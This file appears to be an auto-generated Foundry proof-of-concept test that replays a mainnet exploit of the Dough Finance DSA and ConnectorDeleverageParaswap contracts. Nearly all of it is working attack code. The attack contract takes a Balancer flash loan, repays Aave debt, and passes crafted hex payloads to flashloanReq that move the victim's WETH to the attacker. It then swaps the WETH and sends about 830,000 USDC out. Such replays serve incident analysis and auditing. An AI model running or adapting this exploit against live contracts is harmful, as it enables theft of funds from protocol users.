
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 20288622;
    uint256 constant TX_TIMESTAMP = 1720765571;
    uint256 constant TX_BLOCK_NUMBER = 20288623;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntimeFallb();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return address(0);
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _installRuntimeFallb() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.aEthUSDC, "aEthUSDC", 997500);
        _expectProfit(Addresses.A_2913D9_4A0F, address(0), Addresses.USDC, "USDC", 830487417542);
    }
}

contract OurAttack {
    function attack() external payable {
        _borrowFlashLiquidit();
    }

    function _borrowFlashLiquidit() internal {
        _replayProtocolCalls();
        _replayProtocolCal2();
    }

    function _replayProtocolCalls() internal {
        IERC20Like(Addresses.variableDebtEthUSDC).balanceOf(Addresses.DoughDsa);
    }

    function _replayProtocolCal2() internal {
        {
            _recordBalancerPre(_addressArray1(Addresses.USDC));
            if (address(this) != address(this)) {
                (bool ok,) = address(this)
                    .call(
                        abi.encodeWithSignature(
                            "recordBalancerPre(address[])", _addressArray1(Addresses.USDC)
                        )
                    );
                ok;
            }
            IVault_BA1222(Addresses.Vault_BA1222)
                .flashLoan(address(this), _addressArray1(Addresses.USDC), _uintArray1(938566826811), hex"");
        }
    }

    function _handleCallback() internal {
        _replayDone[REPLAY_CALLBACK_2] = true;
    }

    function flashCallback() internal {
        _replayDone[REPLAY_CALLBACK_3] = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
    }

    function flashCallback2() internal {
        IERC20Like(Addresses.USDC)
            .approve(Addresses.InitializableImmutableAdminUpgradeabilityProxy_87870B, type(uint256).max);
    }

    function flashCallback3() internal {
        {
            uint256 repayActionGraphAmount = 938566826811;
            IInitializableImmutableAdminUpgradeabilityProxy_87870B(
                    Addresses.InitializableImmutableAdminUpgradeabilityProxy_87870B
                ).repay(Addresses.USDC, repayActionGraphAmount, 2, Addresses.DoughDsa);
        }
    }

    function flashCallback4() internal {
        IERC20Like(Addresses.USDC)
            .transferFrom(Addresses.attacker_eoa, Addresses.ConnectorDeleverageParaswap, 6000000);
    }

    function flashCallback5() internal {
        IERC20Like(Addresses.aEthWETH).balanceOf(Addresses.DoughDsa);
    }

    function flashCallback6() internal {
        {
            bytes[] memory abiArg6 = new bytes[](2);
            bytes memory replayPayload1 =
                hex"000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000012725dd1d243aba0e75fe645cc4873f9e65afe688c928e1f210000000000000012725dd1d243aba0e75fe645cc4873f9e65afe688c928e1f21000000000000000000000000534a3bb1ecb886ce9e7632e33d97bf22f838d085000000000000000000000000534a3bb1ecb886ce9e7632e33d97bf22f838d08500000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000c475b4b22d0000000000000000000000000000000000000000000000000000000000000016000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000004c4b40000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000205ae2253019ceed07000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000";
            abiArg6[0] = replayPayload1;
            bytes memory flashloanReqPayload2 =
                hex"000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000012725dd1d243aba0e75fe645cc4873f9e65afe688c928e1f210000000000000012725dd1d243aba0e75fe645cc4873f9e65afe688c928e1f21000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000087870bca3f3fd6335c3f4ce8392d69350b4fa4e200000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000534a3bb1ecb886ce9e7632e33d97bf22f838d08500000000000000000000000011a8dc866c5d03ff06bb74565b6575537b2159780000000000000000000000000000000000000000000000205ae2253019ceed0700000000000000000000000000000000000000000000000000000000";
            abiArg6[1] = flashloanReqPayload2;
            IConnectorDeleverageParaswap(Addresses.ConnectorDeleverageParaswap)
                .flashloanReq(
                    false,
                    _addressArray1(Addresses.USDC),
                    _uintArray1(5000000),
                    _uintArray1(0),
                    _addressArray0(),
                    _uintArray0(),
                    abiArg6
                );
        }
    }

    function flashCallback7() internal {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function flashCallback8() internal {
        {
            uint256 approveActionGraphAllowance = 596844648055377423623;
            IERC20Like(Addresses.WETH).approve(Addresses.A_7A250D_488D, approveActionGraphAllowance);
        }
    }

    function flashCallback9() internal {
        IERC20Like(Addresses.WETH).balanceOf(address(this));
    }

    function flashCallback10() internal {
        {
            uint256 swapAmountIn = 596844648055377423623;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.WETH).allowance(address(this), Addresses.A_7A250D_488D)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.WETH).approve(Addresses.A_7A250D_488D, type(uint256).max);
                }
                IContract_7A250D_488D(Addresses.A_7A250D_488D)
                    .swapExactTokensForTokens(
                        swapAmountIn,
                        0,
                        _addressArray2(Addresses.WETH, Addresses.USDC),
                        address(this),
                        9283912839128391283
                    );
            }
        }
    }

    function flashCallback11() internal {
        {
            uint256 usdcTransferAmount = 938566826811;
            IERC20Like(Addresses.USDC).transfer(Addresses.Vault_BA1222, usdcTransferAmount);
        }
    }

    function flashCallback12() internal {
        IERC20Like(Addresses.USDC).balanceOf(address(this));
    }

    function flashCallback13() internal {
        {
            uint256 transferActionGraphAmount = 830487417542;
            IERC20Like(Addresses.USDC).transfer(Addresses.A_2913D9_4A0F, transferActionGraphAmount);
        }
    }

    receive() external payable {}

    function executeAction(
        uint256 amount,
        address arg1,
        uint256 amount1,
        address arg3,
        uint256 amount2,
        uint256 amount3
    ) external payable {
        amount;
        arg1;
        amount1;
        arg3;
        amount2;
        amount3;
        if (!_replayDone[REPLAY_CALLBACK_2]) _handleCallback();
        return;
    }

    function receiveFlashLoan(
        address[] calldata arg0,
        uint256[] calldata arg1,
        uint256[] calldata arg2,
        bytes calldata arg3
    ) external payable {
        arg0;
        arg1;
        arg2;
        arg3;
        if (!_replayDone[REPLAY_CALLBACK_3]) flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x5b8b87a8) {
            _borrowFlashLiquidit();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    bytes32 private constant REPLAY_CALLBACK_2 = keccak256("poc.replay.REPLAY_CALLBACK_2");
    bytes32 private constant REPLAY_CALLBACK_3 = keccak256("poc.replay.REPLAY_CALLBACK_3");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }

    function _addressArray0() internal pure returns (address[] memory out) {
        out = new address[](0);
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant DefaultReserveInterestRateStrategy = 0x0fc12Ad84210695dE8C0D5D8B6f720C37cEaB02f;
    address internal constant attack_contract = 0x11A8DC866C5d03ff06bb74565b6575537B215978;
    address internal constant STABLE_DEBT_TOKEN_IMPL = 0x15C5620dfFaC7c7366EED66C20Ad222DDbB1eD57;
    address internal constant A_2913D9_4A0F = 0x2913d90D94C9833B11a3E77F136da03075c04a0F;
    address internal constant DefaultReserveInterestRateStrategy_811D = 0x42ec99A020B78C449d17d93bC4c89e0189B5811d;
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant aEthWETH = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;
    address internal constant DoughDsa = 0x534a3bb1eCB886cE9E7632e33D97BF22f838d085;
    address internal constant attacker_eoa = 0x67104175fc5fabbdb5A1876c3914e04B94c71741;
    address internal constant variableDebtEthUSDC = 0x72E95b8931767C79bA4EeE721354d6E99a61D004;
    address internal constant A_7A250D_488D = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant ATOKEN_IMPL = 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d;
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_87870B =
        0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address internal constant aEthUSDC = 0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c;
    address internal constant ConnectorDeleverageParaswap = 0x9f54e8eAa9658316Bb8006E03FFF1cb191AafBE6;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant VARIABLE_DEBT_TOKEN_IMPL = 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6;
    address internal constant stableDebtEthUSDC = 0xB0fe3D292f4bd50De902Ba5bDF120Ad66E9d7a39;
    address internal constant UNI_V2 = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address internal constant Vault_BA1222 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IConnectorDeleverageParaswap {
    function flashloanReq(
        bool,
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address[] calldata,
        uint256[] calldata,
        bytes[] calldata
    ) external;
}

interface IContract_7A250D_488D {
    function swapExactTokensForTokens(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IInitializableImmutableAdminUpgradeabilityProxy_87870B {
    function repay(address, uint256, uint256, address) external returns (uint256);
}

interface IVault_BA1222 {
    function flashLoan(address, address[] calldata, uint256[] calldata, bytes calldata) external;
}
